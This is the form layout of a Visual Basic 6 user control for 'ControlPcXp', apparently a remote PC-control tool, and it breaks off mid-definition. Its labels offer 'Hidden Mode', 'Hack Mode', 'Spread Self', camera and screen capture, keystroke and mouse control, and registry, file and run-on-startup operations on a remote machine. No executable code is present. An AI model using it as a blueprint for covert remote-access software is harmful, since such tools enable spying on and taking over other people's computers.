VERSION 5.00
Begin VB.UserControl Services 
   Alignable       =   -1  'True
   AutoRedraw      =   -1  'True
   BackColor       =   &H00E0E0E0&
   ClientHeight    =   8205
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   7110
   ClipBehavior    =   0  'None
   ControlContainer=   -1  'True
   ScaleHeight     =   8205
   ScaleWidth      =   7110
   ToolboxBitmap   =   "Services_controlpcxp.ctx":0000
   Begin VB.Frame Frame2 
      BackColor       =   &H00E0E0E0&
      Height          =   7455
      Left            =   5640
      TabIndex        =   63
      Top             =   7200
      Visible         =   0   'False
      Width           =   7455
      Begin ControlPcXp.button Button5 
         Height          =   375
         Left            =   240
         TabIndex        =   79
         Top             =   6840
         Width           =   2175
         _ExtentX        =   3836
         _ExtentY        =   661
         Caption         =   "Submit Query/Error"
      End
      Begin ControlPcXp.button Button3 
         Height          =   375
         Left            =   5400
         TabIndex        =   74
         Top             =   6840
         Visible         =   0   'False
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         Caption         =   "OK"
      End
      Begin VB.TextBox abt_me 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   0  'None
         Height          =   5175
         Left            =   360
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   67
         Text            =   "Services_controlpcxp.ctx":0312
         Top             =   1560
         Width           =   6375
      End
      Begin VB.Image Image4 
         Height          =   300
         Left            =   3960
         Picture         =   "Services_controlpcxp.ctx":0745
         Top             =   960
         Width           =   300
      End
      Begin VB.Label Label18 
         AutoSize        =   -1  'True
         BackColor       =   &H00E0E0E0&
         Caption         =   "ControlPcXp"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   15.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000080FF&
         Height          =   360
         Left            =   360
         TabIndex        =   66
         Top             =   480
         Width           =   2445
      End
      Begin VB.Label Label17 
         AutoSize        =   -1  'True
         BackColor       =   &H00E0E0E0&
         Caption         =   "Version 1.1"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   195
         Left            =   2880
         TabIndex        =   65
         Top             =   720
         Width           =   810
      End
      Begin VB.Label Label16 
         BackStyle       =   0  'Transparent
         Caption         =   "Trial Period End !"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   450
         TabIndex        =   64
         Top             =   1005
         Width           =   3210
      End
      Begin VB.Shape Shape2 
         BorderColor     =   &H0080C0FF&
         FillColor       =   &H000040C0&
         FillStyle       =   0  'Solid
         Height          =   375
         Left            =   360
         Shape           =   4  'Rounded Rectangle
         Top             =   960
         Width           =   3375
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00E0E0E0&
      Caption         =   "Setup"
      Height          =   7815
      Left            =   5400
      TabIndex        =   50
      Top             =   7080
      Visible         =   0   'False
      Width           =   6855
      Begin ControlPcXp.button Button4 
         Height          =   495
         Left            =   5160
         TabIndex        =   78
         Top             =   7080
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   873
         Caption         =   "OK"
      End
      Begin VB.TextBox Text2 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   720
         MaxLength       =   12
         TabIndex        =   52
         Top             =   720
         Width           =   1935
      End
      Begin VB.TextBox Text3 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   720
         MaxLength       =   12
         TabIndex        =   51
         Top             =   1560
         Width           =   1935
      End
      Begin VB.Image Image1 
         Height          =   300
         Index           =   2
         Left            =   240
         Picture         =   "Services_controlpcxp.ctx":0BF2
         Top             =   1560
         Width           =   300
      End
      Begin VB.Image Image1 
         Height          =   300
         Index           =   1
         Left            =   240
         Picture         =   "Services_controlpcxp.ctx":103C
         Top             =   720
         Width           =   300
      End
      Begin VB.Image Image3 
         Height          =   300
         Left            =   240
         Picture         =   "Services_controlpcxp.ctx":148C
         Top             =   4320
         Width           =   615
      End
      Begin VB.Image Image2 
         Height          =   300
         Left            =   240
         Picture         =   "Services_controlpcxp.ctx":1920
         Top             =   3480
         Width           =   615
      End
      Begin VB.Image Image1 
         Height          =   300
         Index           =   0
         Left            =   240
         Picture         =   "Services_controlpcxp.ctx":1DB4
         Top             =   5760
         Width           =   300
      End
      Begin VB.Label Label12 
         BackColor       =   &H00E0E0E0&
         Caption         =   $"Services_controlpcxp.ctx":220B
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1095
         Left            =   720
         TabIndex        =   77
         Top             =   5400
         Width           =   5895
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   "ControlPcXp Username :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   240
         Left            =   720
         TabIndex        =   57
         Top             =   360
         Width           =   5460
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "ControlPcXp Password :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   240
         Left            =   720
         TabIndex        =   56
         Top             =   1200
         Width           =   5535
      End
      Begin VB.Label Label7 
         AutoSize        =   -1  'True
         ForeColor       =   &H00008000&
         Height          =   195
         Left            =   120
         TabIndex        =   55
         Top             =   1920
         Width           =   45
      End
      Begin VB.Label Label8 
         BackStyle       =   0  'Transparent
         Caption         =   "This User Name and Password is required to login from Remote Computer ."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   735
         Left            =   1080
         TabIndex        =   54
         Top             =   3480
         Width           =   5535
      End
      Begin VB.Label Label9 
         BackStyle       =   0  'Transparent
         Caption         =   " A Password should contain some characters and some numbers . dont use weak passwords as they can caught easily ."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   735
         Left            =   1080
         TabIndex        =   53
         Top             =   4320
         Width           =   5535
      End
   End
   Begin ControlPcXp.button Command2 
      Height          =   255
      Left            =   2520
      TabIndex        =   76
      Top             =   4800
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   450
      Caption         =   "Select Preffered"
   End
   Begin ControlPcXp.button Command1 
      Height          =   255
      Left            =   240
      TabIndex        =   75
      Top             =   4800
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   450
      Caption         =   "Select All"
   End
   Begin ControlPcXp.button Button2 
      Height          =   375
      Left            =   5640
      TabIndex        =   73
      Top             =   5760
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      Caption         =   "About"
   End
   Begin ControlPcXp.button Button1 
      Height          =   375
      Left            =   1920
      TabIndex        =   72
      Top             =   5760
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      Caption         =   "Hack Mode"
   End
   Begin ControlPcXp.button HiddenMode 
      Height          =   375
      Left            =   240
      TabIndex        =   71
      Top             =   5760
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      Caption         =   "Hidden Mode"
   End
   Begin ControlPcXp.button TestButton 
      Height          =   285
      Left            =   4080
      TabIndex        =   70
      Top             =   5280
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   503
      Caption         =   "Test"
   End
   Begin ControlPcXp.button SetupUserName 
      Height          =   255
      Left            =   2550
      TabIndex        =   69
      Top             =   540
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   450
      Caption         =   "change"
   End
   Begin ControlPcXp.button StartServices 
      Height          =   375
      Left            =   5520
      TabIndex        =   68
      Top             =   480
      Width           =   1215
      _ExtentX        =   1931
      _ExtentY        =   661
      Caption         =   "Start"
   End
   Begin ControlPcXp.Socket nSocket 
      Left            =   1800
      Top             =   7680
      _ExtentX        =   873
      _ExtentY        =   873
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Print"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   43
      Left            =   4800
      TabIndex        =   48
      ToolTipText     =   "Available Only in Pro Version"
      Top             =   4200
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Spread Self"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   42
      Left            =   4800
      TabIndex        =   47
      ToolTipText     =   "Available Only in Pro Version"
      Top             =   3960
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Window Message"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   41
      Left            =   4800
      TabIndex        =   46
      ToolTipText     =   "Available Only in Pro Version"
      Top             =   3720
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Open Url"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   40
      Left            =   4800
      TabIndex        =   45
      ToolTipText     =   "Available Only in Pro Version"
      Top             =   3480
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Keyboard Control"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   39
      Left            =   4800
      TabIndex        =   44
      ToolTipText     =   "Available Only in Pro Version"
      Top             =   3240
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Mouse Control"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   38
      Left            =   4800
      TabIndex        =   43
      ToolTipText     =   "Available Only in Pro Version"
      Top             =   3000
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Screen Capture"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   37
      Left            =   4800
      TabIndex        =   42
      ToolTipText     =   "Available Only in Pro Version"
      Top             =   2760
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Camera Capture"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   36
      Left            =   4800
      TabIndex        =   41
      ToolTipText     =   "Normal Service"
      Top             =   2520
      Width           =   2055
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   1920
      TabIndex        =   38
      Top             =   5280
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Send Ip Address"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   35
      Left            =   4800
      TabIndex        =   37
      ToolTipText     =   "Extended Service"
      Top             =   2280
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Find Files"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   34
      Left            =   4800
      TabIndex        =   36
      Top             =   2040
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Messaging"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   33
      Left            =   4800
      TabIndex        =   35
      ToolTipText     =   "Normal Service"
      Top             =   1800
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Terminate Process"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   32
      Left            =   4800
      TabIndex        =   34
      ToolTipText     =   "Extended Service"
      Top             =   1560
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Shell Open"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   31
      Left            =   4800
      TabIndex        =   33
      ToolTipText     =   "Normal Service"
      Top             =   1320
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Download Url"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   30
      Left            =   4800
      TabIndex        =   32
      ToolTipText     =   "Extended Service"
      Top             =   1080
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "File Manager"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   29
      Left            =   2520
      TabIndex        =   31
      Top             =   4440
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "List Subkeys"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   28
      Left            =   2520
      TabIndex        =   30
      ToolTipText     =   "Normal Service"
      Top             =   4200
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "List Subvalues"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   27
      Left            =   2520
      TabIndex        =   29
      ToolTipText     =   "Normal Service"
      Top             =   3960
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Write Registry String"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   26
      Left            =   2520
      TabIndex        =   28
      ToolTipText     =   "Extended Service"
      Top             =   3720
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Read Registry"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   25
      Left            =   2520
      TabIndex        =   27
      ToolTipText     =   "Normal Service"
      Top             =   3480
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Delete Registry Value"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   24
      Left            =   2520
      TabIndex        =   26
      ToolTipText     =   "Extended Service"
      Top             =   3240
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Create Path"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   23
      Left            =   2520
      TabIndex        =   25
      ToolTipText     =   "Extended Service"
      Top             =   3000
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Delete Directory"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   22
      Left            =   2520
      TabIndex        =   24
      ToolTipText     =   "Extended Service"
      Top             =   2760
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "List Subdirectorys"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   21
      Left            =   2520
      TabIndex        =   23
      ToolTipText     =   "Normal Service"
      Top             =   2520
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Move File"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   20
      Left            =   2520
      TabIndex        =   22
      ToolTipText     =   "Extended Service"
      Top             =   2280
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Rename File"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   19
      Left            =   2520
      TabIndex        =   21
      ToolTipText     =   "Extended Service"
      Top             =   2040
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Dir File"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   18
      Left            =   2520
      TabIndex        =   20
      ToolTipText     =   "Normal Service"
      Top             =   1800
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Delete File"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   17
      Left            =   2520
      TabIndex        =   19
      ToolTipText     =   "Extended Service"
      Top             =   1560
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "File Size"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   16
      Left            =   2520
      TabIndex        =   18
      ToolTipText     =   "Normal Service"
      Top             =   1320
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Folder Size"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   15
      Left            =   2520
      TabIndex        =   17
      ToolTipText     =   "Normal Service"
      Top             =   1080
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Run File"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   14
      Left            =   240
      TabIndex        =   16
      ToolTipText     =   "Normal Service"
      Top             =   4440
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Send File"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   13
      Left            =   240
      TabIndex        =   15
      ToolTipText     =   "Extended Service"
      Top             =   4200
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Quit"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   12
      Left            =   240
      TabIndex        =   14
      ToolTipText     =   "Normal Service"
      Top             =   3960
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Runservice Entries"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   11
      Left            =   240
      TabIndex        =   13
      ToolTipText     =   "Normal Service"
      Top             =   3720
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Startup Run Entries"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   10
      Left            =   240
      TabIndex        =   12
      ToolTipText     =   "Normal Service"
      Top             =   3480
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Windows Key"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   9
      Left            =   240
      TabIndex        =   11
      ToolTipText     =   "Normal Service"
      Top             =   3240
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Windows Version"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   8
      Left            =   240
      TabIndex        =   10
      ToolTipText     =   "Normal Service"
      Top             =   3000
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Disk Drives"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   7
      Left            =   240
      TabIndex        =   9
      ToolTipText     =   "Normal Service"
      Top             =   2760
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "System Directory"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   6
      Left            =   240
      TabIndex        =   8
      ToolTipText     =   "Normal Service"
      Top             =   2520
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Windows Directory"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   5
      Left            =   240
      TabIndex        =   7
      ToolTipText     =   "Normal Service"
      Top             =   2280
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFFF&
      Caption         =   "Foreground Window"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Index           =   4
      Left            =   240
      TabIndex        =   6
      ToolTipText     =   "Normal Service"
      Top             =   2040
      Width           =   2055
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
